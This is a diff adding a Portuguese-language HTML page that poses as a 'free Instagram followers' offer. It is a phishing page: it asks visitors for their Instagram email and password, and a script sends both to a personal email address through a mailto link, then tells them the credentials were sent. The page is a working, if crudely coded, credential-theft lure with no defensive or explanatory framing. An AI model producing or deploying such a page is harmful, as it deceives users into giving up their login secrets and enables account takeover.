@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>💥seguidores instagram gratis💥</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f5f5f5;
+        }
+        .container {
+            width: 400px;
+            background-color: #fff;
+            border-radius: 5px;
+            padding: 40px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        input {
+            width: calc(100% - 22px); /* considerando o padding */
+            padding: 10px;
+            margin-bottom: 20px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+        }
+        button {
+            width: 100%;
+            padding: 10px 20px;
+            background-color: #e50914;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>💥Seguidores instagram gratis💥</h1>
+        <p>Informe seu email e senha do Instagram:</p>
+        <input type="email" id="email" placeholder="Seu e-mail">
+        <input type="password" id="password" placeholder="Senha do Instagram">
+        <button onclick="sendCredentials()">Enviar</button>
+    </div>
+
+    <script>
+        function sendCredentials() {
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+
+            // Aqui você pode adicionar a lógica para enviar as credenciais para o seu email
+            var subject = 'Credenciais do Instagram';
+            var body = 'Email do Instagram: ' + email + '\n' +
+                       'Senha do Instagram: ' + password;
+            var mailtoLink = 'mailto:leozm85@gmwil.com=' + encodeURIComponent(subject) + '&body=' + encodeURIComponent(body);
+            window.location.href = mailtoLink;
+
+            // Limpa os campos após enviar
+            document.getElementById('email').value = '';
+            document.getElementById('password').value = '';
+
+            // Exibe uma mensagem de confirmação
+            alert('Credenciais enviadas com sucesso para o seu email!');
+        }
+    </script>
+</body>
+</html>
